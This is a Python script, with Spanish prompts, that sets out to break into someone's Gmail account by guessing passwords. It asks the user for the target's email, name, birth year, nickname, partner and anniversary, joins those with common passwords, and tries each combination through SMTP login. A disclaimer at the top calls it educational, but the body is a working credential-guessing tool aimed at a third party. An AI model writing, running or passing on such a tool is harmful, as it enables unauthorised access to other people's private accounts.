#-*- coding: utf-8 -*-
# no me hago responsable de lo que se haga con este programa, este software está hecho con fines didacticos.
import smtplib
import subprocess
import getpass
import os
import ftplib



def config():
	conf = str()
	while conf != 'r':
		subprocess.call(["cmd.exe","/c","cls"])
		conf = str(input('''
		/////////////////////////////
		Elige el color de las letras:
		-----------------------------
		[v]erde                      
		[b]lanco                     
		[a]marillo                   
		-----------------------------
		[r]egresar al menu principal
		/////////////////////////////
		> '''))
		if conf == "v":
			subprocess.call(["cmd.exe","/c","color a"])
		elif conf == "b":
			subprocess.call(["cmd.exe","/c","color 7"])
		elif conf == "a":
			subprocess.call(["cmd.exe","/c","color e"])

def bforce():
	data = ["123456","12345678","qwerty", "password", "123456789", "hola"]
	subprocess.call(["cmd.exe","/c","cls"])
	print("este algoritmo solo funciona con correos de gmail.")
	email = str(input("introduce el corre electronico de el objetivo: "))
	name = str(input("introduce el nombre de el objetivo: "))
	data.append(name)
	year = str(input("introduce el año de nacimeinto de {}: ".format(name)))
	data.append(year)
	nickname = str(input("cual es el apodo de {}? ".format(name)))
	data.append(nickname)
	cpl = str(input("{} tiene pareja? Y/N: ".format(name)))
	if cpl == "y" or cpl == "Y":
		data.append("iloveyou")
		data.append("teamo")
		couple = str(input("como se llama la pareja de {}?: ".format(name)))
		data.append(couple)
		anniversary = str(input("cuando es el aniversario de {} y {}? ".format(couple, name)))
		data.append(anniversary)
	server = smtplib.SMTP('smtp.gmail.com:587')
	server.starttls()
	for passw in data:
		for passw2 in data:
			rpass = passw + passw2
			try:
				server.login(email, rpass)
			except Exception as e:
				print("{} probablemente no es la clave de {}".format(rpass, email))
				print("")
			else:
				print("{} es la clave de {}".format(rpass, email))
				break
	getpass.getpass("presione enter para continuar...")

def run():
	do = str()
	while do != 'exit':
		subprocess.call(["cmd.exe","/c","cls"])
		do = str(input('''
			*************************
			[f]uerza bruta
			[c]onfiguracion
			-------------------------
			para salir escribe "exit"
			*************************
            
             > '''))
		do == do.lower()
		if do == "f":
			bforce()
		elif do == "c":
			config()


if __name__ == '__main__':
	run()


	